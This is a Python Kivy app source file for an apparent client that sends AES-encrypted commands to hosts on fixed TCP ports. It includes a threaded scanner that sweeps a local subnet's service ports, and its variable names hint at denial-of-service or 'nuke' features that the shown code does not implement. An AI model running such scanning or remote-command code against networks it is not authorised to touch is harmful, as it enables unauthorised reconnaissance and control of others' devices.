
from kivy.config import Config

Config.set('graphics', 'maxfps', 240)
import socket
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle, Line
from kivy.animation import Animation
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.progressbar import ProgressBar
from kivy.uix.label import Label
from kivy.metrics import dp  # Add this import
from kivy.uix.relativelayout import RelativeLayout
from kivy.animation import Animation
from kivy.app import App
from kivy.uix.widget import Widget
from kivymd.app import MDApp
from kivy.core.text import LabelBase
from kivy.uix.accordion import Accordion, AccordionItem
from kivy.uix.tabbedpanel import TabbedPanel
import random


from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.properties import ObjectProperty, StringProperty, BooleanProperty
from kivy.uix.floatlayout import FloatLayout
# from kivymd.app import MDApp
# from kivymd.uix.list import OneLineListItem
from kivymd.app import MDApp 
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.utils import get_color_from_hex
from kivy.lang import Builder
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.core.window import Window
# from kivy.uix.bottomnavigation import BottomNavigation, BottomNavigationItem
from kivy.metrics import dp
from kivy.properties import ObjectProperty

# Import other necessary modules
import webbrowser  # For opening websites
import subprocess  # For running commands
import ctypes  # For interacting with Windows APIs
import time  # For time delays
# from plyer import notification
# import pyttsx3  # For text to speech
from kivymd.app import MDApp
from kivy.lang import Builder
# from kivymd.uix.tab import MDTabsBase
from kivy.uix.floatlayout import FloatLayout
from kivy.core.text import LabelBase
from kivy.uix.tabbedpanel import TabbedPanelItem
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
import threading
import time
import subprocess
# from PIL import Image
import netifaces
from time import sleep
import queue as Queue
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Manager
import socket
import kivy
# from scapy.all import ARP, Ether, srp
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
#import psutil
import socket
#import android.net.TrafficStats
import struct
#import psutil
from kivy.clock import Clock
import threading
import time
import os,sys
from kivy.uix.label import Label
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.widget import Widget
#from kivy.properties import ObjectProperty
from kivy.app import App
from kivy.uix.popup import Popup
from kivy.uix.label import Label
from kivy.graphics import Color, Rectangle
from kivy import platform
from kivy.uix.screenmanager import ScreenManager, Screen
#from kivy.lang.parser
#import global_idmap
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.dropdown import DropDown
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.lang import Builder
import threading
import socket
import ipaddress
import Crypto
from Crypto.Cipher import AES

import kivymd
import os

#import face_recognition
# from kivy.uix.camera import Camera
# import pyttsx3
#from deepface import DeepFace
import numpy as np
# import cv2

import glob
#import face_recognition
# from PIL import Image

from kivy.core.window import Window

# Disable multi-touch emulation for smoother touch events
# Config.set('input', 'mouse', 'mouse,disable_multitouch') # it jsut fucking breaks on phone..
from kivy.uix.modalview import ModalView
from kivy.core.window import Window

Window.softinput_mode = 'below_target'

selfdestructbuttonpresses = 0
nuketbuttonpresses = 0

# Get the current screen resolution
screen_width, screen_height = Window.size

# print(cv2.__version__)
subnetsSchooltouse = False
diversify_devices = [] # idk if you want to add like an added
showndevicesforscandiversify = []
def add_devices(devices):
    global diversify_devices
    if devices not in diversify_devices:
        diversify_devices.append(devices)
    # check if there are any duplicates
    # duplicates = len(devices) != len(set(devices))
    # if duplicates: # does not work. 
    #     print("There are duplicates in the list - fixing")
    #     # remove the duplicates
    #     devices = list(set(devices))
    #     diversify_devices = devices
    # else:
    #     print("No duplicates found")

def slp(seconds):
    "Sleeps without causing the thread to sleep"
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass
    return

problematicips = []
DosingThreads = []

last_call_time = time.time()

class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def rmStringIP(ip, selfrootids):
    """Removes the ip button from the scanner"""
    for widget in selfrootids.ids.devicesdiversify.children:
        if isinstance(widget, Button):
            if ip in widget.text:
                selfrootids.ids.devicesdiversify.remove_widget(widget)

def removeDevice(ip):
    global varyobject
    if ip in showndevicesforscandiversify:
        showndevicesforscandiversify.remove(ip)
    if ip in diversify_devices:
        diversify_devices.remove(ip)
    rmStringIP(ip, varyobject)

def threaded_connections(device, todo, q, mode='vary'): # so that kivy will stop crying
    t = KThread(target = insend, args=(device, todo, q, mode))
    t.daemon = True
    t.start()
    
def get_ip_address(): # the ipv4 addresss
        # subnet = ''
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            ip_address = addresses[netifaces.AF_INET][0]['addr']
            print(ip_address)
            if ip_address != '127.0.0.1':
                return ip_address

q = Queue.Queue()


def send(connection, todo, mode='vary'): # switched to diversify to use the diff port and diff encryption key        
    # before you start doing this for diversify you need to make how you start to connect and disconnect from servers, i suggest using the dropdown that you press, and atop of it will be a scan button, and as more are detected and are not already in the list show the ip, and a CONNECT|DISCONNECT depending on whether or not it's selected or not, and if it's not responding remove it from the list.
    global insend
    
    try: change_label_text_diversify(f'User clicked on: {todo.replace("OD2tIzZNuOHBqnu", " ")}')
    except: pass
    
    try:
        def insend(serverip, msg, q, mode='vary'):
            before_change = msg
            try:
                try:
                    server=serverip
                    if mode == 'diversify':
                        port = 45102
                    else:
                        port=3451
                    
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((server, port))
                except Exception as e:
                    if mode == 'diversify':
                        global problematicips
                        if serverip not in problematicips:
                            problematicips.append(serverip)
                        print(f'added {serverip} to problematicips')
                    else:
                        Clock.schedule_once(lambda dt: vary().showpopup(str((f'Connection Failed,\nVerify:\nWi-Fi = On.\nHost = On\n\n{serverip}'))), 0)
                    return False
                
                if mode == 'diversify':
                    TUTKEYPHONE =  "placeholder"
                else:
                    TUTKEYPHONE =  "placeholder"
                
                def encrypt(key, plaintext):
                    cipher = AES.new(key, AES.MODE_EAX)
                    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
                    return (cipher.nonce, tag, ciphertext)

                def decrypt(key, ciphertext):
                    (nonce, tag, ciphertext) = ciphertext
                    cipher = AES.new(key, AES.MODE_EAX, nonce)
                    plaintext = cipher.decrypt(ciphertext)
                    try:
                        cipher.verify(tag)
                        return plaintext.decode("utf-8")
                    except ValueError:
                        return None

                message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
                message = str(message)
                message = message.encode('utf-8')
                message = bytes(message)
                msg_length = len(message)
                send_length = str(msg_length).encode('utf-8')
                send_length += b' ' * (64 - len(send_length))
                client.send(send_length)
                client.send(message)
                #print('Disconnecting from host')
                
                msg = '!DISCONNECT'
                message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
                message = str(message)
                message = message.encode('utf-8')
                message = bytes(message)
                msg_length = len(message)
                send_length = str(msg_length).encode('utf-8')
                send_length += b' ' * (64 - len(send_length))
                client.send(send_length)
                client.send(message)
                client.close()
                client.detach()
                print(f'Successfully sent {before_change}, to client {serverip}')
            except Exception as e:
                print(f'Error: {e}')
                Clock.schedule_once(lambda dt: vary().showpopup(str(e)), 0)
    except Exception as e:
        #app = vary()
        #app.create_popup()
        print(f'Error: {e}')
        Clock.schedule_once(lambda dt: vary().showpopup(str(e)), 0)
                
    if mode == 'diversify':
        global problematicips
        global resultsofcheckifdeviceresponds
        # problematicips = []
        
        print(len(diversify_devices))
        if len(diversify_devices) == 0:
            Clock.schedule_once(lambda dt: vary().showpopup(str(f'You are sending to no hosts')), 0)
            return
        
        for i in diversify_devices:
            try:
                threaded_connections(i, todo, q, mode='diversify')
            except Exception as e:        
                print(f'Error: {e}')
                if i not in problematicips:
                    problematicips.append(i)
                    
        # Function for threaded execution
        def check_device_thread(ip):
            global resultsofcheckifdeviceresponds
            result = check_if_diversify_host_responds(ip)
            resultsofcheckifdeviceresponds.append((ip, result))
            
        resultsofcheckifdeviceresponds = []

        for i in problematicips:
            if i not in showndevicesforscandiversify:
                problematicips.remove(i)
                
        print(f'problematic ip[s]: {problematicips}')
        
        
        if problematicips:
            # Create threads to check devices
            threads = []
            for i in diversify_devices:
                try:
                    thread = threading.Thread(target=check_device_thread, args=(i,))
                    threads.append(thread)
                    thread.start()
                except Exception as e:
                    print(f'Error: {e}')
                    if i not in problematicips:
                        problematicips.append(i)
            
            # Wait for all threads to complete
            # for thread in threads:
                # thread.join()
            
            # Print results
            print("Results:")
            badip = []
            for ip, result in resultsofcheckifdeviceresponds:
                print(f'Check for {ip}: {result}')
                if result == False:
                    badip.append(ip)
                if result == True:
                    problematicips.remove(ip)

            # check if there are even any ips that are being sent to. aka if the list is empty

            strbuildpro = ", ".join(str(i) for i in problematicips)
            Clock.schedule_once(lambda dt: vary().showpopup(str(f'Connection timedout for these devices:\n{strbuildpro}, Please note!, *currently not removing them*')), 0)
            for i in problematicips:
                problematicips.remove(i)
            # for i in problematicips:
                # removeDevice(i)
        
    
    else:
        try:   
            # after finishing functions - here is where it actually starts.
                
            print(todo)
            print(connection.root.ids.conntext.text)
            #try:
            #    aakjrh = q.get_nowait()
            #except:
            #    aakjrh = 'is Empty'    
            #print(f'The queue is : {aakjrh}')
            print('Sending request, operation has started')
            try:
                if ',' in (connection.root.ids.conntext.text): # note that the device relates to the specified ipv4 of the host, between splitted or not
                    print('Okay, will send to multiple devices')
                    print('The devices: ', end='')
                    devicesList = connection.root.ids.conntext.text.replace(' ', '').split(',')
                    devicesList = list({device for device in devicesList})
                    for device in devicesList:
                        print(device, end=', ')
                    for device in devicesList:
                        try:
                            threaded_connections(device, todo, q)
                        except Exception as e:        
                            print(f'Error: {e}')
                            Clock.schedule_once(lambda dt: vary().showpopup(str(f'Connection Failed,\nVerify:\nWi-Fi = On.\nHost = On\n\n{device}')), 0)
                else:
                    threaded_connections(connection.root.ids.conntext.text, todo, q)

            except Exception as e:
                print(f'Error: {e}')
                Clock.schedule_once(lambda dt: vary().showpopup(str(e)), 0)

                return
            
        except Exception as e:
            #app = vary()
            #app.create_popup()
            print(f'Error: {e}')
            Clock.schedule_once(lambda dt: vary().showpopup(str(e)), 0)


def scan_network(self):
    global isnetworkscanrunning
    print("scan_network() called")
    
    Clock.schedule_once(lambda dt: self.addscanninglabel(), 0)
    Clock.schedule_once(lambda dt: self.addclose_button(), 0)

    devices = []

    def scan_port(ip_port):
        global isnetworkscanrunning
        ip = ip_port[0]
        for i in ip_port[1]:
            with ThreadPoolExecutor() as scanport_listexeaura:
                global snetwork_listexeaura_list
                snetwork_listexeaura_list.append(scanport_listexeaura)
                socket.setdefaulttimeout(0.7)
                
                results = scanport_listexeaura.map(lambda x: (x, socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, x))), i)
                for port, result in results:
                    if result == 0:
                        print(f'{ip}:{port}')
                        devices.append(f'{ip}:{port}')
                        global isnetworkscanrunning
                        if isnetworkscanrunning == True:
                            Clock.schedule_once(lambda dt: self.addclient_button(f'{ip}:{port}'), 0)
                        else:
                            scanport_listexeaura.shutdown()
                        #   print(current_y)
                        return

    def scan_ip(ip):
        #ports = [[80, 81, 82, 83, 84, 85, 86, 87, 88, 89],[448, 449, 450, 451, 452, 443, 444, 445, 446, 447], [32, 33, 34, 25, 26, 27, 28, 29, 30, 31], [110, 111, 112, 113, 114, 115, 116, 117, 118, 119], [143, 144, 145, 146, 147, 148, 149, 150, 151, 152], [53, 54, 55, 56, 57, 58, 59, 60, 61, 62], [992, 993, 994, 995, 21, 22, 23, 24, 990, 991], [3392, 3393, 3394, 3395, 3396, 3397, 3398, 3389, 3390, 3391], [8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089], [8448, 8449, 8450, 8451, 8452, 8443, 8444, 8445, 8446, 8447], [587, 588, 589, 590, 591, 592, 593, 594, 595, 596], [1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203], [3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314, 3315], [5440, 5441, 5432, 5433, 5434, 5435, 5436, 5437, 5438, 5439], [161, 162, 163, 164, 165, 166, 167, 168, 169, 170], [389, 390, 391, 392, 393, 394, 395, 396, 397, 398], [640, 641, 642, 643, 644, 645, 636, 637, 638, 639], [1440, 1441, 1442, 1433, 1434, 1435, 1436, 1437, 1438, 1439], [1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530], [3305, 3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314], [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8011, 8012, 8013, 8014, 8015, 8016, 8017], [8448, 8449, 8450, 8451, 8452, 8443, 8444, 8445, 8446, 8447], [8896, 8897, 8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895], [9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009], [9090, 9091, 9092, 9093, 9094, 9095, 9096, 9097, 9098, 9099], [10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009], [27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024, 27025, 27026], [9090, 5900, 143, 8080, 22, 23, 25, 161, 53, 8888, 5432, 443, 587, 80, 993, 995, 3306, 110, 631, 8443], [389, 5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5011, 5012, 5013, 5014, 5015, 161, 123, 636], [5900, 5901, 5902, 5903, 5904, 5905, 5906, 5907, 5908, 5909], [137, 138, 139, 445, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8011, 8012, 5353, 1900], [20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 502, 504], [5900, 5901, 5902, 5903, 5904, 5905, 5906, 5907, 5908, 5909], [1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654], [1888, 1889, 1890, 1891, 1892, 1883, 1884, 1885, 1886, 1887], [2600, 2601, 2602, 2603, 2604, 2605, 2606, 2607, 2608, 2609], [9200, 9201, 9202, 9203, 9204, 9205, 9206, 9207, 9208, 9209, 9300, 9301, 9302, 9303, 9304], [11211, 11212, 11213, 11214, 11215, 11216, 11217, 11218, 11219, 11220], [15008, 15009, 15000, 15001, 15002, 15003, 15004, 15005, 15006, 15007], [16000, 16001, 16002, 16003, 16004, 16005, 16006, 16007, 16008, 16009], [18000, 18001, 18002, 18003, 18004, 18005, 18006, 18007, 18008, 18009], [20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009], [22000, 22001, 22002, 22003, 22004, 22005, 22006, 22007, 22008, 22009], [25000, 25001, 25002, 25003, 25004, 25005, 25006, 25007, 25008, 25009], [27008, 27009, 27000, 27001, 27002, 27003, 27004, 27005, 27006, 27007]]
        #ports = [[22, 23, 53, 80, 110, 143, 445, 3389, 161, 443], [587, 631, 993, 995, 3306, 5432, 5900, 8080, 8443], [8888, 9090, 8015, 111, 9000, 8009, 8008, 139]]
        ports = [[443, 8009, 8008, 445], [5900, 80, 139, 9000, 8015, 23], [8080,8443, 111, 21]]
        global snetwork_listexeaura_list

        with concurrent.futures.ThreadPoolExecutor () as executor:
            snetwork_listexeaura_list.append(executor)
            executor.map(scan_port, [(ip,ports)])

    def get_subnet(): 
        subnet = ''
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ip_address = addresses[netifaces.AF_INET][0]['addr']
                print(ip_address)
                if ip_address != '127.0.0.1':
                    octets = ip_address.split('.')
                    subnet = '.'.join(octets[:3]) + '.'
                    return subnet
                else:
                    
                    print(f'subnet:', subnet)
                    if subnet == '':
                        Clock.schedule_once(lambda dt: self.showpopup('Please type the ipv4 subnet, As I wasn\'t able to automatically get it.'), 0)
                        return

    getfromkivyuisubnet = self.root.ids.ipv4subnet.text
    
    global result_layout_dos
    if getfromkivyuisubnet == '':
        subnet = get_subnet()
    else:
        subnet = getfromkivyuisubnet
    print(f'subnet: {subnet}')
    if subnet == '' or subnet == None or subnet == 'None':
        self.close_results(result_layout_dos)
        return # so it'll make the user type the subnet
    global snetwork_listexeaura_list
    snetwork_listexeaura_list = []
    global executorofscanip
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip :
        snetwork_listexeaura_list.append(executorofscanip)
        executorofscanip.map(scan_ip,[subnet + str(i) for i in range(1,255)])
    
    if bool(devices) == False:
        print('list is empty')
        self.close_results(result_layout_dos)
        Clock.schedule_once(lambda dt: self.showpopup_message("Couldn\'t find any devices!", "Whoops!"), 0)
        return        
    
    print(devices)
    Clock.schedule_once(lambda dt: self.final_button(), 0)
    Clock.schedule_once(lambda dt: self.removescanninglabel(), 0)
    
 



def check_if_diversify_host_responds(objectr='None', ip = 'None'):
    # host_ips = []
    diversifyportSL = 45102 

    def scan_ip(ip):
        socket.setdefaulttimeout(0.7)
        try:
            results = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, diversifyportSL))
            if results == 0:
                return True
            else: return False
        except Exception as e:
            print(f'Error in check_if_diversify_host_responds: {e}')
            return False # error probably due to host not existing
    return scan_ip(ip)

def change_label_text_diversify(new_text):
    global varyobject
    varyobject.ids['diversifytext'].text = new_text


class varylayout(BoxLayout):
    pass


class vary(MDApp):

    password = StringProperty('')
    is_tools_unlocked = BooleanProperty(False)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)


    def on_start(self):
        LabelBase.register(name="Quicksand", fn_regular="Quicksand.ttf")


            
    def build(self):
        try:
            global varyobject
            varyobject = varylayout()
            self.root = varyobject
            # set the opacity of varyobject to 0
            self.theme_cls.font_styles["Quicksand"] = [
                "Quicksand",
                16,
                False,
                0.15,
            ]
            self.theme_cls.theme_style = "Dark"  # Set the theme to dark
            
            self.theme_cls.font_styles["H1"] = ["Quicksand", 96, False, -1.5]
            self.theme_cls.font_styles["H2"] = ["Quicksand", 60, False, -0.5]
            self.theme_cls.font_styles["H3"] = ["Quicksand", 48, False, 0]
            self.theme_cls.font_styles["H4"] = ["Quicksand", 34, False, 0.25]
            self.theme_cls.font_styles["H5"] = ["Quicksand", 24, False, 0]
            self.theme_cls.font_styles["H6"] = ["Quicksand", 20, False, 0.15]
         

            varyobject.opacity = 0
            varyobject = self.root
            # schedule a function to fade in varyobject after 1 second
            Clock.schedule_once(self.fade_in)

            # else:
            # Clock.schedule_once(lambda dt: vary().showpopup(str('You aren\'t permitted to use this app.')), 0)
        except Exception as e:
           global q
           print(f'\n\nError:\n{e}\n\n')
           Clock.schedule_once(lambda dt: vary().showpopup(str(e)), 0)

    def fade_in(self, dt):
        # create and start an animation to change the opacity of varyobject from 0 to 1 in 2 seconds
        anim = Animation(opacity=1, duration=2)
        anim.start(varyobject)
    

    
    def scan_for_vary_hosts(self):
        # This function scans for hosts on a network and displays the results in a layout
        # print('pressed')

        def remove_widgets(layout):
            # This function removes all widgets from the layout and stops the scanning threads
            global HostsList, exit_button, isNetworkListoopen, scanlistthread, scan_thread, isScanning, executorofscanip, isnetworkscanrunning
            isNetworkListoopen = False
            isScanning = False
            isnetworkscanrunning = False
            def stop_threads():
                # This function stops all the scanning threads
                global HostsList, exit_button, isNetworkListoopen, scanlistthread, scan_thread, isScanning
                # Kill the scanning threads
                scan_thread.kill()
                #executorip.shutdown(wait=False)
                scanlistthread.kill()
                for i in snetwork_listexeaura_list:
                    i.shutdown(wait=False)
                #print(i)
            try:
                executorofscanip.shutdown(wait=False)
            except:
                pass
            
            try:
                threading.Thread(target=stop_threads).start()
            except:
                pass
            try:
                layout.remove_widget(scanning_label)
            except:
                pass
            try:
                layout.remove_widget(exit_button)
            except:
                pass
            try:
                for widget in HostsList:
                    layout.remove_widget(widget)
            except:
                pass
            print('Removed all widgets from the layout')

        def start_scan_and_show_results():
            # This function starts the scanning thread and adds the widgets to the layout
            global isnetworkscanrunning
            isnetworkscanrunning = True
            def scan_and_add_widgets():
                # This function checks if the list is already open and scans the network
                global isNetworkListoopen, exit_button, result_layout_varyscan, scan_thread
                if isNetworkListoopen == True:
                    print('There is a list that is already open!')
                    Clock.schedule_once(lambda dt: vary().showpopup(str('There is a list that is already open!')), 0)
                    return "Already open"
                isNetworkListoopen = True
                global HostsList
                global exit_button
                HostsList = []

                result_layout_varyscan = self.root.ids.result_layout_vary_scan
                global isScanning
                isScanning = True
                scan_thread = KThread(target=scan_network_forvarydevices, args=(self, ))
                scan_thread.start()

                    
                    #result_layout_varyscan.add_widget(Label(text=f"{clients}"))

                    #Clock.schedule_once(lambda dt: self.buildUIforclients(clients), 0)
                        #button.pos_hint = {'center_x': 0.5, 'y': current_y}  # Set position of button using pos_hint
            global scanlistthread
            scanlistthread = KThread(target=scan_and_add_widgets)
            scanlistthread.start()

        def show_scanning_label():
            # This function adds a label to indicate that scanning is in progress
            global result_layout_varyscan, scanning_label
            scanning_label = Label(text="Scanning the network for VAry hosts", size_hint_y=None, height=200, color=(0.8, 0.3, 0.4, 1), bold=True)
            #exit_button.size = 70000
            result_layout_varyscan.add_widget(scanning_label)

        def hide_scanning_label():
            # This function removes the label that indicates that scanning is in progress
            global result_layout_varyscan, scanning_label
            result_layout_varyscan.remove_widget(scanning_label)

                
        def create_host_button(host):
            # This function creates a button for each host found on the network and adds it to the layout
            global result_layout_varyscan
            a = host.split(':')
            button = Button(text=f'Click to add {a[0]} to the hosts', size_hint_y=None, height=200, background_color=(0.6, 0.2, 0.6, 1), color=(0.5, 0.2, 0.3, 1))
            HostsList.append(button)
            button.bind(on_press=lambda instance: self.addipforhosts(host))
            result_layout_varyscan.add_widget(button)  # Add new widget to end of list

        def create_exit_button():
            # This function creates a button to exit the results and adds it to the layout
            global result_layout_varyscan, exit_button
            exit_button = Button(text="Stop | Exit", size_hint_y=None, height=200, background_color=(0.5, 0.2, 0.7, 1), color=(0.6, 0.2, 0.9, 1), bold=True)
            exit_button.bind(on_press=lambda instance: remove_widgets(result_layout_varyscan))
            #exit_button.size = 70000
            result_layout_varyscan.add_widget(exit_button)

        def create_final_label():
            # This function creates a label to fill the space at the end of the layout
            global result_layout_varyscan
            lbl = Label(text='', size_hint_y=None, height=100, color=(0, 0, 0, 1))
            
            result_layout_varyscan.add_widget(lbl)  # Add new widget to end of list
                
        def scan_network_forvarydevices(self):
            global isnetworkscanrunning
            print("scan_network() called")
            
            Clock.schedule_once(lambda dt: show_scanning_label(), 0)
            Clock.schedule_once(lambda dt: create_exit_button(), 0)

            devices = []


            def scan_ip(ip):
                #ports = [[80, 81, 82, 83, 84, 85, 86, 87, 88, 89],[448, 449, 450, 451, 452, 443, 444, 445, 446, 447], [32, 33, 34, 25, 26, 27, 28, 29, 30, 31], [110, 111, 112, 113, 114, 115, 116, 117, 118, 119], [143, 144, 145, 146, 147, 148, 149, 150, 151, 152], [53, 54, 55, 56, 57, 58, 59, 60, 61, 62], [992, 993, 994, 995, 21, 22, 23, 24, 990, 991], [3392, 3393, 3394, 3395, 3396, 3397, 3398, 3389, 3390, 3391], [8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089], [8448, 8449, 8450, 8451, 8452, 8443, 8444, 8445, 8446, 8447], [587, 588, 589, 590, 591, 592, 593, 594, 595, 596], [1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203], [3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314, 3315], [5440, 5441, 5432, 5433, 5434, 5435, 5436, 5437, 5438, 5439], [161, 162, 163, 164, 165, 166, 167, 168, 169, 170], [389, 390, 391, 392, 393, 394, 395, 396, 397, 398], [640, 641, 642, 643, 644, 645, 636, 637, 638, 639], [1440, 1441, 1442, 1433, 1434, 1435, 1436, 1437, 1438, 1439], [1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530], [3305, 3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314], [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8011, 8012, 8013, 8014, 8015, 8016, 8017], [8448, 8449, 8450, 8451, 8452, 8443, 8444, 8445, 8446, 8447], [8896, 8897, 8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895], [9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009], [9090, 9091, 9092, 9093, 9094, 9095, 9096, 9097, 9098, 9099], [10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009], [27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024, 27025, 27026], [9090, 5900, 143, 8080, 22, 23, 25, 161, 53, 8888, 5432, 443, 587, 80, 993, 995, 3306, 110, 631, 8443], [389, 5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5011, 5012, 5013, 5014, 5015, 161, 123, 636], [5900, 5901, 5902, 5903, 5904, 5905, 5906, 5907, 5908, 5909], [137, 138, 139, 445, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8011, 8012, 5353, 1900], [20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 502, 504], [5900, 5901, 5902, 5903, 5904, 5905, 5906, 5907, 5908, 5909], [1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654], [1888, 1889, 1890, 1891, 1892, 1883, 1884, 1885, 1886, 1887], [2600, 2601, 2602, 2603, 2604, 2605, 2606, 2607, 2608, 2609], [9200, 9201, 9202, 9203, 9204, 9205, 9206, 9207, 9208, 9209, 9300, 9301, 9302, 9303, 9304], [11211, 11212, 11213, 11214, 11215, 11216, 11217, 11218, 11219, 11220], [15008, 15009, 15000, 15001, 15002, 15003, 15004, 15005, 15006, 15007], [16000, 16001, 16002, 16003, 16004, 16005, 16006, 16007, 16008, 16009], [18000, 18001, 18002, 18003, 18004, 18005, 18006, 18007, 18008, 18009], [20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009], [22000, 22001, 22002, 22003, 22004, 22005, 22006, 22007, 22008, 22009], [25000, 25001, 25002, 25003, 25004, 25005, 25006, 25007, 25008, 25009], [27008, 27009, 27000, 27001, 27002, 27003, 27004, 27005, 27006, 27007]]
                #ports = [[22, 23, 53, 80, 110, 143, 445, 3389, 161, 443], [587, 631, 993, 995, 3306, 5432, 5900, 8080, 8443], [8888, 9090, 8015, 111, 9000, 8009, 8008, 139]]
                #ports = [[443, 8009, 8008, 445], [5900, 80, 139, 9000, 8015, 23], [8080,8443, 111]]
                varyport = 3451

                socket.setdefaulttimeout(0.7)
                
                result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, varyport))
                try:
                    if result == 0:
                        print(f'{ip} is a VAry host')
                        devices.append(f'{ip}:{varyport}')
                        global isnetworkscanrunning
                        if isnetworkscanrunning == True:
                            Clock.schedule_once(lambda dt: create_host_button(f'{ip}:{varyport}'), 0)
                        #print(f'isnetowrkscanning : {isnetworkscanrunning}')
                        return
                except Exception as e:
                    print(e)

            def get_subnet(): 
                subnet = ''
                interfaces = netifaces.interfaces()
                for interface in interfaces:
                    addresses = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addresses:
                        ip_address = addresses[netifaces.AF_INET][0]['addr']
                        if ip_address != '127.0.0.1':
                            octets = ip_address.split('.')
                            subnet = '.'.join(octets[:3]) + '.'
                            return subnet
                        else:
                            
                            print(f'subnet:', subnet)
                            if subnet == '':
                                Clock.schedule_once(lambda dt: self.showpopup('Please type the ipv4 subnet, As I wasn\'t able to automatically get it.'), 0)
                                return
            getfromkivyuisubnet = self.root.ids.ipv4subnet.text
            global result_layout_varyscan
            
            if getfromkivyuisubnet == '':
                subnet = get_subnet()
            else:
                subnet = getfromkivyuisubnet
            print(f'subnet: {subnet}')
            if subnet == '' or subnet == None or subnet == 'None':
                remove_widgets(result_layout_varyscan)
                return # so it'll make the user type the subnet
            
            global snetwork_listexeaura_list
            snetwork_listexeaura_list = []
            global executorofscanip
            with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip :
                snetwork_listexeaura_list.append(executorofscanip)
                executorofscanip.map(scan_ip,[subnet + str(i) for i in range(1,255)])
            if bool(devices) == False:
                print('list is empty')
                remove_widgets(result_layout_varyscan)
                Clock.schedule_once(lambda dt: self.showpopup_message("Couldn\'t find any devices!", "Whoops!"), 0)
                return
            
            print(devices)

                    
            Clock.schedule_once(lambda dt: create_final_label(), 0)
            Clock.schedule_once(lambda dt: hide_scanning_label(), 0)
            
        
        # Call the main function to start scanning and showing results
        start_scan_and_show_results()
        return
        
        
        
    def addipforhosts(self, host):
        a = host.split(':')
        global varyobject
        context = varyobject.ids.conntext.text
        splitted = context.replace(" ", "").split(',')
        print(splitted)
        splitted.append(a[0])
        splitted = list({ip for ip in splitted})
